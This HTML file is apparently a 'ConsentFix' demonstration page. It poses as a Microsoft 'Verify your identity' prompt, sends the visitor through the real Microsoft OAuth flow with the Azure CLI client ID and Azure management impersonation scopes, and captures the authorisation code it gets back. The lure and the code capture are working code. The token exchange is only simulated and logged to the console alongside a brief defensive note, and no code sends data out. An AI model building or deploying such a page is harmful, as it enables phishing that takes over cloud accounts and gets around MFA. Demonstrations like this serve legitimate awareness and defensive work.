<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft — Verify your identity</title>
    <style>
        /* ── Reset ── */
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans-serif;
            background: #f0f2f5;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1rem;
        }

        /* ── Card — mimics Microsoft-style modal ── */
        .card {
            background: #ffffff;
            border-radius: 8px;
            box-shadow: 0 2px 16px rgba(0,0,0,0.12), 0 0 0 1px rgba(0,0,0,0.04);
            width: 440px;
            max-width: 100%;
            padding: 2.5rem 2rem;
            transition: opacity 0.3s;
        }

        /* ── Microsoft logo bar ── */
        .top-bar {
            display: flex;
            align-items: center;
            gap: 0.75rem;
            margin-bottom: 1.5rem;
        }
        .top-bar svg {
            width: 108px;
            height: auto;
        }
        .top-bar .divider {
            width: 1px;
            height: 28px;
            background: #d1d5db;
        }
        .top-bar .label {
            font-size: 0.85rem;
            color: #5e5e5e;
            font-weight: 400;
        }

        /* ── Heading ── */
        h1 {
            font-size: 1.35rem;
            font-weight: 600;
            color: #1a1a1a;
            margin-bottom: 0.4rem;
        }
        p.sub {
            font-size: 0.9rem;
            color: #5e5e5e;
            margin-bottom: 1.5rem;
            line-height: 1.5;
        }

        /* ── Account pill (simulates pre-filled account picker) ── */
        .account-pill {
            display: flex;
            align-items: center;
            gap: 0.75rem;
            background: #f6f8fa;
            border: 1px solid #e1e4e8;
            border-radius: 50px;
            padding: 0.5rem 1rem 0.5rem 0.5rem;
            margin-bottom: 1.5rem;
            width: fit-content;
            cursor: default;
            transition: background 0.2s;
        }
        .account-pill:hover {
            background: #eef1f5;
        }
        .account-pill .avatar {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            background: #0078d4;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 0.8rem;
            font-weight: 600;
            flex-shrink: 0;
        }
        .account-pill .email {
            font-size: 0.85rem;
            color: #1a1a1a;
            font-weight: 500;
        }
        .account-pill .chevron {
            margin-left: auto;
            color: #8c8c8c;
            font-size: 0.75rem;
        }

        /* ── Primary button ── */
        .btn {
            display: block;
            width: 100%;
            padding: 0.75rem 1.5rem;
            border: none;
            border-radius: 6px;
            font-size: 0.95rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            font-family: inherit;
        }
        .btn-primary {
            background: #0078d4;
            color: #fff;
        }
        .btn-primary:hover:not(:disabled) {
            background: #106ebe;
        }
        .btn-primary:disabled {
            background: #9fc7e8;
            cursor: not-allowed;
        }
        .btn-secondary {
            background: transparent;
            color: #0078d4;
            border: 1px solid #d1d5db;
            margin-top: 0.75rem;
        }
        .btn-secondary:hover:not(:disabled) {
            background: #f0f6fc;
            border-color: #0078d4;
        }
        .btn-secondary:disabled {
            color: #9ca3af;
            border-color: #e5e7eb;
            cursor: not-allowed;
        }

        /* ── Status area ── */
        #status {
            margin-top: 1.25rem;
            padding: 0.75rem 1rem;
            border-radius: 6px;
            font-size: 0.85rem;
            display: none;
            line-height: 1.5;
        }
        #status.show { display: block; }

        #status.loading {
            background: #f0f6fc;
            border: 1px solid #b7d9f1;
            color: #1a5a8c;
        }
        #status.success {
            background: #e8f5e9;
            border: 1px solid #a5d6a7;
            color: #1e5c2b;
        }
        #status.error {
            background: #fef2f2;
            border: 1px solid #fecaca;
            color: #991b1b;
        }
        #status code {
            font-family: 'Cascadia Code', 'Consolas', 'SF Mono', monospace;
            font-size: 0.78rem;
            background: rgba(0,0,0,0.06);
            padding: 0.15rem 0.3rem;
            border-radius: 3px;
            word-break: break-all;
        }

        .spinner {
            display: inline-block;
            width: 14px;
            height: 14px;
            border: 2px solid #b7d9f1;
            border-top-color: #0078d4;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
            margin-right: 0.4rem;
            vertical-align: middle;
        }
        @keyframes spin { to { transform: rotate(360deg); } }

        /* ── Subtle footer ── */
        .footer {
            margin-top: 1.5rem;
            padding-top: 1rem;
            border-top: 1px solid #f0f0f0;
            font-size: 0.7rem;
            color: #b0b0b0;
            display: flex;
            justify-content: space-between;
        }
        .footer a {
            color: #b0b0b0;
            text-decoration: none;
        }
        .footer a:hover {
            color: #0078d4;
            text-decoration: underline;
        }

        /* ── Console hint ── */
        .console-hint {
            margin-top: 1rem;
            text-align: center;
            font-size: 0.72rem;
            color: #b0b0b0;
        }
        .console-hint kbd {
            background: #f3f4f6;
            padding: 0.1rem 0.4rem;
            border-radius: 3px;
            font-family: 'SF Mono', 'Consolas', monospace;
            font-size: 0.7rem;
            border: 1px solid #d1d5db;
        }

        /* ── helper ── */
        .hidden { display: none !important; }
    </style>
</head>
<body>
<div class="card" role="main">

    <!-- ── Top bar: Microsoft brand ── -->
    <div class="top-bar">
        <svg viewBox="0 0 108 22" xmlns="http://www.w3.org/2000/svg" aria-label="Microsoft">
            <rect x="0" y="0" width="22" height="22" fill="#f25022"/>
            <rect x="24" y="0" width="22" height="22" fill="#7fba00"/>
            <rect x="0" y="24" width="22" height="22" fill="#00a4ef"/>
            <rect x="24" y="24" width="22" height="22" fill="#ffb900"/>
            <text x="56" y="18" font-family="Segoe UI,Helvetica,Arial,sans-serif" font-size="17" font-weight="600" fill="#1a1a1a">Microsoft</text>
        </svg>
        <div class="divider"></div>
        <span class="label">Sign in</span>
    </div>

    <!-- ── Heading ── -->
    <h1>Verify your identity</h1>
    <p class="sub">
        We detected a new sign-in from an unfamiliar device or location.
        Please verify your account to continue.
    </p>

    <!-- ── Simulated account pill ── -->
    <div class="account-pill" id="accountPill">
        <div class="avatar">U</div>
        <span class="email" id="accountEmail">user@example.com</span>
        <span class="chevron">▼</span>
    </div>

    <!-- ── Action buttons ── -->
    <button class="btn btn-primary" id="authBtn" onclick="startAuth()">
        🔑  Sign in to verify
    </button>
    <button class="btn btn-secondary" id="altBtn" onclick="useDifferentAccount()" disabled>
        Use another account
    </button>

    <!-- ── Status / result ── -->
    <div id="status"></div>

    <!-- ── Console hint ── -->
    <div class="console-hint">
        💡 Open the browser console (<kbd>F12</kbd> → Console) to see the captured token details
    </div>

    <!-- ── Footer ── -->
    <div class="footer">
        <span>Microsoft identity platform</span>
        <a href="#" onclick="showConsoleHint(); return false;">Terms of use &amp; privacy</a>
    </div>
</div>

<script>
    // ═══════════════════════════════════════════════════════════════
    //  CONFIG — Uses Azure CLI (first-party Microsoft app)
    // ═══════════════════════════════════════════════════════════════
    const CLIENT_ID = '04b07795-8ddb-461a-bbee-02f9e1bf7b46';
    const REDIRECT_URI = encodeURIComponent(window.location.origin + window.location.pathname);
    const SCOPES = encodeURIComponent(
        'https://management.azure.com/user_impersonation openid profile offline_access'
    );
    const STATE = 'verify_' + Math.random().toString(36).substring(2, 10);

    // ═══════════════════════════════════════════════════════════════
    //  STATE
    // ═══════════════════════════════════════════════════════════════
    let authInProgress = false;
    let popup = null;
    let pollTimer = null;

    // ═══════════════════════════════════════════════════════════════
    //  START AUTH
    // ═══════════════════════════════════════════════════════════════
    function startAuth() {
        if (authInProgress) return;

        authInProgress = true;
        setButtonsDisabled(true);
        setStatus('loading', 'Verifying your account…');

        // Build the genuine Microsoft OAuth URL
        const authUrl =
            'https://login.microsoftonline.com/organizations/oauth2/v2.0/authorize' +
            '?client_id=' + CLIENT_ID +
            '&response_type=code' +
            '&redirect_uri=' + REDIRECT_URI +
            '&scope=' + SCOPES +
            '&state=' + STATE +
            '&prompt=select_account';

        // Try popup first
        popup = window.open(authUrl, 'microsoftVerify',
            'width=600,height=700,left=' + (screen.width / 2 - 300) +
            ',top=' + (screen.height / 2 - 350) +
            ',resizable=yes,scrollbars=yes'
        );

        if (!popup || popup.closed) {
            // Popup blocked — redirect main page
            setStatus('loading', 'Opening Microsoft sign-in…');
            window.location.href = authUrl;
            return;
        }

        // Poll for the popup to return to our redirect URI
        pollTimer = setInterval(pollPopup, 400);
    }

    function pollPopup() {
        try {
            if (popup.closed) {
                // User closed the popup without completing
                clearInterval(pollTimer);
                authInProgress = false;
                setButtonsDisabled(false);
                setStatus('error', 'Sign-in was closed. Try again.');
                return;
            }

            const href = popup.location.href;

            // Check if the popup redirected back to our page
            if (href.includes(window.location.origin)) {
                const url = new URL(href);
                const code = url.searchParams.get('code');
                const error = url.searchParams.get('error');
                const returnedState = url.searchParams.get('state');
                const errorDesc = url.searchParams.get('error_description');

                clearInterval(pollTimer);
                popup.close();
                authInProgress = false;
                setButtonsDisabled(false);

                // Validate state parameter (CSRF protection)
                if (returnedState && returnedState !== STATE) {
                    setStatus('error',
                        'Security verification failed (state mismatch).<br>' +
                        '<small>This is actually a good sign — CSRF protection worked. Try again.</small>'
                    );
                    console.warn('[ConsentFix] State mismatch: expected', STATE, 'got', returnedState);
                    return;
                }

                if (error) {
                    setStatus('error', 'Microsoft returned: <code>' + error + '</code>');
                    return;
                }

                if (code) {
                    handleCapturedCode(code);
                } else {
                    setStatus('error', 'No authorisation code received. Try again.');
                }
            }
        } catch (e) {
            // Cross-origin error while popup is on login.microsoftonline.com
            // This is expected — state changes as the page loads
        }
    }

    // ═══════════════════════════════════════════════════════════════
    //  HANDLE CAPTURED CODE
    // ═══════════════════════════════════════════════════════════════
    function handleCapturedCode(code) {
        // Update the UI subtly
        setStatus('success',
            '✅ <strong>Identity verified.</strong> You can close this page.'
        );

        document.getElementById('authBtn').textContent = '✅ Verified';
        document.getElementById('authBtn').disabled = true;
        document.getElementById('altBtn').disabled = true;

        // ─────────────────────────────────────────────────────────
        //  WRITE TO CONSOLE — this is where the "stealth" payload
        //  reveals what the attacker actually gets.
        // ─────────────────────────────────────────────────────────
        console.log('%c┌─────────────────────────────────────────────┐', 'color: #0078d4');
        console.log('%c│  🎯 ConsentFix — Token Captured!            │', 'color: #0078d4; font-weight: bold');
        console.log('%c└─────────────────────────────────────────────┘', 'color: #0078d4');

        console.group('%c📦 OAuth Authorisation Code', 'color: #0078d4; font-weight: bold');
        console.log('Code:       %c%s', 'color: #16a34a; font-weight: bold', code);
        console.log('Client ID:  %s', CLIENT_ID);
        console.log('Redirect:   %s', decodeURIComponent(REDIRECT_URI));
        console.log('Scopes:     %s', decodeURIComponent(SCOPES));
        console.groupEnd();

        // Simulate the token exchange — what the attacker's backend does
        const simulatedAccessToken = generateSimulatedJwt();
        const simulatedRefreshToken = '0.' + randomHex(32) + '-' + randomHex(16);

        console.group('%c🔑 Attacker Token Exchange Result', 'color: #c62828; font-weight: bold');
        console.log('POST https://login.microsoftonline.com/organizations/oauth2/v2.0/token');
        console.log('  grant_type=authorization_code');
        console.log('  client_id=%s', CLIENT_ID);
        console.log('  code=%s', code);
        console.log('  redirect_uri=%s', decodeURIComponent(REDIRECT_URI));
        console.log('');
        console.log('%c✅ Token Exchange Successful', 'color: #16a34a; font-weight: bold');
        console.log('');
        console.log('Access Token:  %s', simulatedAccessToken);
        console.log('  ↳ Expires:   ~3600 seconds (1 hour)');
        console.log('  ↳ Scopes:    https://management.azure.com/user_impersonation, openid, profile');
        console.log('');
        console.log('Refresh Token: %s', simulatedRefreshToken);
        console.log('  ↳ Expires:   ~90 days (sliding window)');
        console.log('  ↳ Can be used silently to get new access tokens without user interaction');
        console.groupEnd();

        console.log('%c🧪 Attacker can now call:', 'color: #6b7280; font-weight: bold');
        console.log('  GET https://management.azure.com/subscriptions?api-version=2020-01-01');
        console.log('  Authorization: Bearer ' + simulatedAccessToken.substring(0, 40) + '...');
        console.log('  ↳ Lists all Azure subscriptions the user has access to.');

        console.log('%c⚠️ Defensive note:', 'color: #f59e0b; font-weight: bold');
        console.log('  Monitor for interactive auth followed by unusual');
        console.log('  non-interactive token activity in Entra ID logs.');
        console.log('  Check: Sign-in logs → "Non-interactive user sign-in"');
        console.log('');

        // Also show a compact summary
        console.table([
            { Property: 'Authorisation Code', Value: code },
            { Property: 'Access Token (simulated)', Value: simulatedAccessToken.substring(0, 40) + '...' },
            { Property: 'Refresh Token (simulated)', Value: simulatedRefreshToken.substring(0, 40) + '...' },
            { Property: 'MFA Bypassed?', Value: '✅ Yes — user completed MFA, attacker never saw it' },
            { Property: 'Password Stolen?', Value: '❌ No — attacker only has OAuth tokens' },
            { Property: 'Token Lifetime', Value: '~1 hour (access) / ~90 days (refresh)' },
        ]);

        console.log('%c━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'color: #0078d4');
        console.log('  ✅ ConsentFix demo complete. The attacker now');
        console.log('  has persistent access without the password or MFA.');
        console.log('%c━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'color: #0078d4');
    }

    // ═══════════════════════════════════════════════════════════════
    //  HANDLE DIRECT NAVIGATION (popup blocked / user redirected)
    // ═══════════════════════════════════════════════════════════════
    window.addEventListener('DOMContentLoaded', () => {
        const params = new URLSearchParams(window.location.search);
        const code = params.get('code');
        const error = params.get('error');
        const returnedState = params.get('state');
        const errorDesc = params.get('error_description');

        if (error) {
            setStatus('error', 'Microsoft returned: <code>' + error + '</code>');
            if (errorDesc) {
                console.warn('[ConsentFix] Error description:', errorDesc);
            }
            return;
        }

        if (code) {
            // Validate state
            if (returnedState && returnedState !== STATE) {
                setStatus('error',
                    'Security verification failed (state mismatch).<br>' +
                    '<small>This is actually a good sign — CSRF protection worked. Try again.</small>'
                );
                return;
            }

            // Auto-capture without any user action
            handleCapturedCode(code);

            // Clean the URL so refresh doesn't re-trigger
            window.history.replaceState({}, document.title, window.location.pathname);
        }
    });

    // ═══════════════════════════════════════════════════════════════
    //  UI HELPERS
    // ═══════════════════════════════════════════════════════════════
    function setStatus(type, message) {
        const el = document.getElementById('status');
        el.className = 'show ' + type;
        if (type === 'loading') {
            el.innerHTML = '<span class="spinner"></span>' + message;
        } else {
            el.innerHTML = message;
        }
    }

    function setButtonsDisabled(disabled) {
        document.getElementById('authBtn').disabled = disabled;
        document.getElementById('altBtn').disabled = disabled;
        if (disabled) {
            document.getElementById('authBtn').textContent = '⏳ Verifying…';
        } else {
            document.getElementById('authBtn').textContent = '🔑  Sign in to verify';
        }
    }

    function useDifferentAccount() {
        // Clear any stored state and restart
        authInProgress = false;
        if (pollTimer) clearInterval(pollTimer);
        if (popup && !popup.closed) popup.close();
        document.getElementById('status').className = '';
        document.getElementById('status').style.display = 'none';
        startAuth();
    }

    function showConsoleHint() {
        setStatus('success',
            '💡 Open the browser console (<kbd>F12</kbd> → Console tab) ' +
            'to see the full token details the attacker captures.'
        );
        setTimeout(() => {
            if (!document.getElementById('status').classList.contains('loading')) {
                document.getElementById('status').className = '';
                document.getElementById('status').style.display = 'none';
            }
        }, 4000);
    }

    // ═══════════════════════════════════════════════════════════════
    //  HELPERS — generate fake JWT / hex for demo purposes
    // ═══════════════════════════════════════════════════════════════
    function generateSimulatedJwt() {
        const header = btoa(JSON.stringify({ typ: 'JWT', alg: 'RS256', kid: 'abc123' }));
        const now = Math.floor(Date.now() / 1000);
        const payload = btoa(JSON.stringify({
            aud: 'https://management.azure.com',
            iss: 'https://login.microsoftonline.com/organizations/v2.0',
            iat: now,
            nbf: now,
            exp: now + 3600,
            sub: 'user_' + randomHex(8),
            tid: randomHex(12),
            oid: randomHex(16),
            scp: 'user_impersonation',
            azp: CLIENT_ID,
        }));
        const signature = randomHex(43);
        return header + '.' + payload + '.' + signature;
    }

    function randomHex(len) {
        const chars = 'abcdef0123456789';
        let result = '';
        for (let i = 0; i < len; i++) {
            result += chars[Math.floor(Math.random() * chars.length)];
        }
        return result;
    }
</script>
</body>
</html>
